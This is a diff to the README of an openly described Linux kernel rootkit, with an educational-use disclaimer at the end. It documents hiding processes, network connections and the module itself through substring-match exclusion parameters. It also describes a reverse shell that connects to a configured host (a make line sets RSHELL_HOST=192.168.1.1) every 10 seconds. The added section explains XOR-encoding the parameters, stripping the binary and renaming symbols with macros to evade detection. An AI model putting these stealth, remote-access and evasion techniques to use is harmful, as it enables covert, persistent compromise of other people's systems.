@@ -73,13 +73,6 @@ make RSHELL_HOST=192.168.1.1 RSHELL_PORT=9001 NET_EXCLUDES=9001 # NET_EXCLUDES i
 | `RSHELL_HOST`    | No        | IP address of the reverse shell host                |
 | `RSHELL_PORT`    | No        | Port address of the reverse shell host                |
 
-Notes
-* When hiding a process - make sure its cmdline contains a substr that is then passed via `STRING_EXCLUDES`, ie: running "`./HIDEME.sh`" and then passing `make ... STRING_EXCLUDES=HIDEME ...`
-* For every str inside the `*_EXCLUDES` params, it's enough for a partial match in order for an entry to be hidden (doesn't have to be a full match, i.e: `STRING_EXCLUDES=ABC` would hide entry `...ABCDE...`)
-* Setting `HIDE_MODULE=1` hides the module, use with caution as it's not trivial to remove it afterwards
-* `NET_EXCLUDES` example - `NET_EXCLUDES=127.0.0.1,12345` would exclude all connections to/from `127.0.0.1` and all connections to/from port `12345`
-* If reverse shell params are set, the module attempts to establish a reverse shell connection to the host every 10 seconds. 
-
 ### Loading / removing the module manually
 To load:
 ```bash
@@ -109,7 +102,30 @@ make clean
 ```
 This will remove all temporary build files
 
-## Disclaimer
+### Additional usage notes
+
+* When hiding a process - make sure its cmdline contains a substr that is then passed via `STRING_EXCLUDES`, ie: running "`./HIDEME.sh`" and then passing `make ... STRING_EXCLUDES=HIDEME ...`
+* For every str inside the `*_EXCLUDES` params, it's enough for a partial match in order for an entry to be hidden (doesn't have to be a full match, i.e: `STRING_EXCLUDES=ABC` would hide entry `...ABCDE...`)
+* Setting `HIDE_MODULE=1` hides the module, use with caution as it's not trivial to remove it afterwards
+* `NET_EXCLUDES` example - `NET_EXCLUDES=127.0.0.1,12345` would exclude all connections to/from `127.0.0.1` and all connections to/from port `12345`
+* If reverse shell params are set, the module attempts to establish a reverse shell connection to the host every 10 seconds.
+
+### Obusfaction
+
+The input parameters (exclusions, reverse shell params) are XOR'd and decrypted during runtime.</br>
+The module is compiled using special flags, and the `.ko` file is stripped as part of the make process.</br>
+However, symbols cannot be completely stripped (due to the nature of `ftrace`) but can be obsufcated manually, using macros:
+```c
+// header file
+#define rshell_func z9qr_x1
+extern int z9qr_x1(void* data);
+...
+// src file
+int z9qr_x1(void* data) {...} // int rshell_func(void* data)
+```
+
+
+# Disclaimer
 
 This project is provided **strictly for educational and ethical research** purposes.  
 Installing or deploying rootkits on unauthorized systems is **illegal and unethical**.
